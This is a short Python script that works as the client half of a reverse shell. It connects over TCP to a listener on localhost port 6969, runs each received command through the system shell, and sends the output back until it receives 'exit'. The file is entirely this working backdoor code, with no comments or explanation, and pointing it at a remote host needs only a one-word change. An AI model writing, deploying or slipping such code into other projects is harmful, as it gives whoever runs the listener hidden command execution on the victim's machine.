import socket
import subprocess
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect(("localhost",6969))
while True:
    command = s.recv(1024).decode("utf-8")
    if command == "exit":
        s.close()
        break
    else:
        CMD = subprocess.run(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
        s.send(CMD.stdout)
